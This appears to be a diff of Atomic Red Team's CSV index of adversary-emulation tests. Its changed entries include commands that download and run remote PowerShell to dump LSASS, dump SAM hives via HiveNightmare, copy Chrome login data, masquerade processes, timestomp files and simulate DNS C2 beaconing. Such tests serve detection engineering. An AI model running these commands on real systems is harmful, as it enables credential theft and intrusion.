@@ -915,7 +915,7 @@ Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads"" -Destination ""$env:locala
 Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\Login Data"" > $null
 ",powershell,"dependencies.0.description: Google Chrome must be on the device.
 
-dependencies.0.prereq_command: 'if ((Test-Path ""C:\Program Files\Google\Chrome\Application\chrome.exe"") -Or (Test-Path ""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"")) {exit 0} else {exit 1}'
+dependencies.0.prereq_command: if ((Test-Path ""C:\Program Files\Google\Chrome\Application\chrome.exe"") -Or (Test-Path ""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"")) {exit 0} else {exit 1}
 
 dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
 $installer = ""PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi""
@@ -2120,7 +2120,9 @@ Upon successful execution, you should see the following file created $env:TEMP\l
 Author of Out-Minidump: Matthew Graeber (@mattifestation)
 ",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
-IEX (New-Object Net.WebClient).DownloadString('https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1'); get-process lsass | Out-Minidump
+try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}
+catch{ $_; exit $_.Exception.Response.StatusCode.Value__}
+get-process lsass | Out-Minidump
 ",powershell,True,,"Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
 ",,,
 T1003.001,OS Credential Dumping: LSASS Memory,Create Mini Dump of LSASS.exe using ProcDump,7cede33f-0acd-44ef-9774-15511300b24b,"The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
@@ -7319,8 +7321,8 @@ input_arguments.output_path.default: $env:TEMP\SharpHound\
 
 "
 T1069.001,Permission Groups Discovery: Local Groups,Wmic Group Discovery,7413be50-be8e-430f-ad4d-07bf197884b2,"Utilizing wmic.exe to enumerate groups on the local system. Upon execution, information will be displayed of local groups on system.
-",windows,,,"wmic.exe group get name
-",powershell,,,,,,
+",windows,,,"wmic group get name
+",command_prompt,,,,,,
 T1069.001,Permission Groups Discovery: Local Groups,WMIObject Group Discovery,69119e58-96db-4110-ad27-954e48f3bb13,"Utilizing PowerShell cmdlet - get-wmiobject, to enumerate local groups on the endpoint. Upon execution, Upon execution, information will be displayed of local groups on system.
 ",windows,,,"Get-WMIObject Win32_Group
 ",powershell,,,,,,
@@ -10067,7 +10069,7 @@ Invoke-Webrequest -Uri ""https://raw.githubusercontent.com/BC-SECURITY/Empire/c1
 ",
 T1003.002,OS Credential Dumping: Security Account Manager,dump volume shadow copy hives with certutil,eeb9751a-d598-42d3-b11c-c122d9c3f6c7,"Dump hives from volume shadow copies with the certutil utility, exploiting a vulnerability known as ""HiveNightmare"" or ""SeriousSAM"".
 This can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)
-",windows,,,"for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\#{target_hive}"" %temp%\#{target_hive}vss%a 2 >nul 2>&1) && dir /B %temp%\#{target_hive}vss%a
+",windows,,,"for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\#{target_hive}"" %temp%\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\#{target_hive}vss*
 ",command_prompt,False,,"for /L %a in (1,1,#{limit}) do @(del %temp%\#{target_hive}vss%a >nul 2>&1)
 ",,,"input_arguments.target_hive.description: Hive you wish to dump
 
@@ -12238,7 +12240,8 @@ IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/R
 T1018,Remote System Discovery,Get-WmiObject to Enumerate Domain Controllers,e3cf5123-f6c9-4375-bdf2-1bb3ba43a1ad,"The following Atomic test will utilize get-wmiobject to enumerate Active Directory for Domain Controllers.
 Upon successful execution a listing of Systems from AD will output with their paths.
 Reference: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1
-",windows,,,"get-wmiobject -class ds_computer -namespace root\directory\ldap
+",windows,,,"try { get-wmiobject -class ds_computer -namespace root\directory\ldap -ErrorAction Stop }
+catch { $_; exit $_.Exception.HResult }
 ",powershell,False,,,,,
 T1018,Remote System Discovery,Remote System Discovery - net group Domain Controller,5843529a-5056-4bc1-9c13-a311e2af4ca0,"Identify remote systems with net.exe querying the Active Directory Domain Controller.
 Upon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the ""Domain Controller"" in the domain. Output will be via stdout.
@@ -13267,8 +13270,8 @@ input_arguments.project-id.type: string
 input_arguments.project-id.default: atomic-project-1
 
 "
-T1059.007,Command and Scripting Interpreter: JavaScript,JScript execution to gather local computer information via cscript,01d75adf-ca1b-4dd1-ac96-7c9550ad1035,"JScript execution test, execute JScript via cscript command. When successful, system information will be written to $env:TEMP\T1059.007.out.txt",windows,,,"cscript ""#{jscript}"" > $env:TEMP\T1059.007.out.txt
-",command_prompt,,,del $env:TEMP\T1059.007.out.txt >nul 2>&1,powershell,"dependencies.0.description: Sample script must exist on disk at specified location (#{jscript})
+T1059.007,Command and Scripting Interpreter: JavaScript,JScript execution to gather local computer information via cscript,01d75adf-ca1b-4dd1-ac96-7c9550ad1035,"JScript execution test, execute JScript via cscript command. When successful, system information will be written to $env:TEMP\T1059.007.out.txt",windows,,,"cscript ""#{jscript}"" > %tmp%\T1059.007.out.txt
+",command_prompt,,,del %tmp%\T1059.007.out.txt >nul 2>&1,powershell,"dependencies.0.description: Sample script must exist on disk at specified location (#{jscript})
 dependencies.0.prereq_command: if (Test-Path ""#{jscript}"") {exit 0} else {exit 1}
 
 dependencies.0.get_prereq_command: New-Item -ItemType Directory (Split-Path ""#{jscript}"") -Force | Out-Null
@@ -14386,6 +14389,9 @@ input_arguments.remote_url.type: url
 input_arguments.remote_url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh
 
 "
+T1059.004,Command and Scripting Interpreter: Bash,Current kernel information enumeration,3a53734a-9e26-4f4b-ad15-059e767f5f14,"An adversary may want to enumerate the kernel information to tailor their attacks for that particular kernel. The following command will enumerate the kernel information.
+",linux,,,"uname -srm
+",sh,False,,,,,
 T1036.003,Masquerading: Rename System Utilities,Masquerading as Windows LSASS process,5ba5a3d1-cf3c-4499-968a-a93155d1f717,"Copies cmd.exe, renames it, and launches it to masquerade as an instance of lsass.exe.
 
 Upon execution, cmd will be launched by powershell. If using Invoke-AtomicTest, The test will hang until the 120 second timeout cancels the session
@@ -14411,9 +14417,16 @@ T1036.003,Masquerading: Rename System Utilities,Masquerading - wscript.exe runni
 
 Upon execution, no windows will remain open but wscript will have been renamed to svchost and ran out of the temp folder
 ",windows,,,"copy %SystemRoot%\System32\wscript.exe %APPDATA%\svchost.exe /Y
-cmd.exe /c %APPDATA%\svchost.exe /B
+cmd.exe /c %APPDATA%\svchost.exe ""PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs""
 ",command_prompt,,,"del /Q /F %APPDATA%\svchost.exe >nul 2>&1
-",,,
+",powershell,"dependencies.0.description: Wscript file to execute must exist on disk
+
+dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs"") {exit 0} else {exit 1}
+
+dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs"") -ErrorAction ignore | Out-Null
+Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/src/T1036.003_masquerading.vbs"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs""
+
+",
 T1036.003,Masquerading: Rename System Utilities,Masquerading - powershell.exe running as taskhostw.exe,ac9d0fc3-8aa8-4ab5-b11f-682cd63b40aa,"Copies powershell.exe, renames it, and launches it to masquerade as an instance of taskhostw.exe.
 
 Upon successful execution, powershell.exe is renamed as taskhostw.exe and executed from non-standard path.
@@ -14425,7 +14438,8 @@ T1036.003,Masquerading: Rename System Utilities,Masquerading - non-windows exe r
 
 Upon successful execution, powershell will execute T1036.003.exe as svchost.exe from on a non-standard path.
 ",windows,,,"copy ""#{inputfile}"" #{outputfile}
-$myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id
+try { $myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id }
+catch { $_; exit $_.Exception.HResult}
 Stop-Process -ID $myT1036_003
 ",powershell,,,"Remove-Item #{outputfile} -Force -ErrorAction Ignore
 ",powershell,"dependencies.0.description: Exe file to copy must exist on disk at specified location (#{inputfile})
@@ -16930,8 +16944,8 @@ T1069.002,Permission Groups Discovery: Domain Groups,Basic Permission Groups Dis
 information will be displayed.
 ",windows,,,"net localgroup
 net group /domain
-net group ""domain admins"" /domain
 net group ""enterprise admins"" /domain
+net group ""domain admins"" /domain
 ",command_prompt,,,,,,
 T1069.002,Permission Groups Discovery: Domain Groups,Permission Groups Discovery PowerShell (Domain),6d5d8c96-3d2a-4da9-9d6d-9a9d341899a7,"Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain
 information will be displayed.
@@ -16940,15 +16954,15 @@ information will be displayed.
 
 input_arguments.user.type: string
 
-input_arguments.user.default: administrator
+input_arguments.user.default: $env:USERNAME
 
 "
 T1069.002,Permission Groups Discovery: Domain Groups,Elevated group enumeration using net group (Domain),0afb5163-8181-432e-9405-4322710c0c37,"Runs ""net group"" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups. This
 test will display some errors if run on a computer not connected to a domain. Upon execution, domain information will be displayed.
-",windows,,,"net group /domai ""Domain Admins""
-net groups ""Account Operators"" /doma
+",windows,,,"net groups ""Account Operators"" /doma
 net groups ""Exchange Organization Management"" /doma
 net group ""BUILTIN\Backup Operators"" /doma
+net group /domai ""Domain Admins""
 ",command_prompt,,,,,,
 T1069.002,Permission Groups Discovery: Domain Groups,Find machines where user has local admin access (PowerView),a2d71eee-a353-4232-9f86-54f4288dd8c1,"Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.
 ",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -18124,12 +18138,11 @@ T1070.006,Indicator Removal on Host: Timestomp,Windows - Timestomp a File,d7512c
 Successful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. 
 
 [Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)
-",windows,,,"import-module #{file_path}\timestomp.ps1
+",windows,,,"import-module ""#{file_path}\timestomp.ps1""
 timestomp -dest ""#{file_path}\kxwn.lock""
-",powershell,,,"Remove-Item #{file_path}\timestomp.ps1 -ErrorAction Ignore
-Remove-Item #{file_path}\kxwn.lock -ErrorAction Ignore",powershell,"dependencies.0.description: timestomp.ps1 must be present in #{file_path}.
+",powershell,,,,powershell,"dependencies.0.description: timestomp.ps1 must be present in #{file_path}.
 
-dependencies.0.prereq_command: if (Test-Path #{file_path}\timestomp.ps1) {exit 0} else {exit 1}
+dependencies.0.prereq_command: if (Test-Path ""#{file_path}\timestomp.ps1"") {exit 0} else {exit 1}
 
 dependencies.0.get_prereq_command: Invoke-WebRequest ""https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1"" -OutFile ""#{file_path}\timestomp.ps1""
 
@@ -18137,13 +18150,13 @@ dependencies.1.description: kxwn.lock must be present in #{file_path}.
 
 dependencies.1.prereq_command: if (Test-Path -path ""#{file_path}\kxwn.lock"") {exit 0} else {exit 1}
 
-dependencies.1.get_prereq_command: New-Item -Path #{file_path}\kxwn.lock -ItemType File
+dependencies.1.get_prereq_command: New-Item -Path ""#{file_path}\kxwn.lock"" -ItemType File
 
 ","input_arguments.file_path.description: File path for timestomp payload
 
 input_arguments.file_path.type: string
 
-input_arguments.file_path.default: $env:appdata\Microsoft
+input_arguments.file_path.default: PathToAtomicsFolder\..\ExternalPayloads
 
 "
 T1546.003,Event Triggered Execution: Windows Management Instrumentation Event Subscription,Persistence via WMI Event Subscription - CommandLineEventConsumer,3c64f177-28e2-49eb-a799-d767b24dd1e0,"Run from an administrator powershell window. After running, reboot the victim machine.
@@ -20910,7 +20923,8 @@ T1059.001,Command and Scripting Interpreter: PowerShell,Run BloodHound from loca
 
 Successful execution will produce stdout message stating ""SharpHound Enumeration Completed"". Upon completion, final output will be a *BloodHound.zip file.
 ",windows,,,"import-module ""PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1""
-Invoke-BloodHound -OutputDirectory $env:Temp
+try { Invoke-BloodHound -OutputDirectory $env:Temp }
+catch { $_; exit $_.Exception.HResult}
 Start-Sleep 5
 ",powershell,,,"Remove-Item $env:Temp\*BloodHound.zip -Force
 ",powershell,"dependencies.0.description: SharpHound.ps1 must be located at ""PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1""
@@ -21468,8 +21482,8 @@ input_arguments.process_to_execute.default: notepad.exe
 
 "
 T1047,Windows Management Instrumentation,WMI Execute rundll32,00738d2a-4651-4d76-adf2-c43a41dfb243,"This test uses wmic.exe to execute a DLL function using rundll32. Specify a valid value for remote IP using the node parameter.
-",windows,,,"wmic /node:#{node} process call create ""rundll32.exe ""#{dll_to_execute}"" #{function_to_execute}""
-",powershell,,,taskkill /f /im calculator.exe,powershell,"dependencies.0.description: DLL with function to execute must exist on disk at specified location (#{dll_to_execute})
+",windows,,,"wmic /node:#{node} process call create ""rundll32.exe \""#{dll_to_execute}\"" #{function_to_execute}""
+",command_prompt,,,taskkill /f /im calculator.exe,powershell,"dependencies.0.description: DLL with function to execute must exist on disk at specified location (#{dll_to_execute})
 dependencies.0.prereq_command: if (Test-Path ""#{dll_to_execute}"") {exit 0} else {exit 1}
 
 dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
@@ -21978,7 +21992,7 @@ input_arguments.ms_product.default: Word
 T1071.004,Application Layer Protocol: DNS,DNS Large Query Volume,1700f5d6-5a44-487b-84de-bc66f507b0a6,"This test simulates an infected host sending a large volume of DNS queries to a command and control server.
 The intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.
 A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.
-",windows,,,"for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type ""#{query_type}"" ""#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}"" -QuickTimeout}
+",windows,,,"for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type ""#{query_type}"" ""#{subdomain}-$(Get-Random -Minimum 1 -Maximum 999999).#{domain}"" -QuickTimeout}
 ",powershell,,,,,,"input_arguments.query_type.description: DNS query type
 
 input_arguments.query_type.type: string
@@ -22001,7 +22015,7 @@ input_arguments.domain.description: Default domain to simulate against
 
 input_arguments.domain.type: string
 
-input_arguments.domain.default: 127.0.0.1.xip.io
+input_arguments.domain.default: 127.0.0.1.nip.io
 
 "
 T1071.004,Application Layer Protocol: DNS,DNS Regular Beaconing,3efc144e-1af8-46bb-8ca2-1376bb6db8b6,"This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.
@@ -22019,7 +22033,7 @@ input_arguments.domain.description: Default domain to simulate against
 
 input_arguments.domain.type: string
 
-input_arguments.domain.default: 127.0.0.1.xip.io
+input_arguments.domain.default: 127.0.0.1.nip.io
 
 input_arguments.subdomain.description: Subdomain prepended to the domain name
 
@@ -22067,7 +22081,7 @@ input_arguments.domain.description: Default domain to simulate against
 
 input_arguments.domain.type: string
 
-input_arguments.domain.default: 127.0.0.1.xip.io
+input_arguments.domain.default: 127.0.0.1.nip.io
 
 "
 T1071.004,Application Layer Protocol: DNS,DNS C2,e7bf9802-2e78-4db9-93b5-181b7bcd37d7,"This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.
